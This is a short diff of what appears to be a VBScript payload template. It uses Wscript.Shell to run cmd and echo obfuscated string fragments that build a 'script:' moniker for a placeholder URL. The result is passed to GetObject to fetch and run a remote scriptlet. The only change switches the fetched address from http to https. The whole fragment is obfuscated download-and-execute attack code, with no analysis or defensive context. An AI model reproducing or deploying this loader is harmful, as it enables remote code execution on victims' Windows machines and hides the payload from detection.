@@ -11,7 +11,7 @@ CreateObject("Wscript.Shell").Run "cmd /c (" & _
 "echo {{VAR2}}=""ri"" & " & _
 "echo. & " & _
 "echo {{VAR3}}=""."" & " & _
-"echo {{VAR4}}=""sC"" ^& {{VAR2}} ^& ""pt:ht"" ^& {{VAR1}} ^& ""://"" & " & _
+"echo {{VAR4}}=""sC"" ^& {{VAR2}} ^& ""pt:ht"" ^& {{VAR1}} ^& ""s://"" & " & _
 "echo {{VAR4}}={{VAR4}} ^& ""{{URL}}"" & " & _
 "echo. & " & _
 "echo GetObject^({{VAR4}}^)" & _
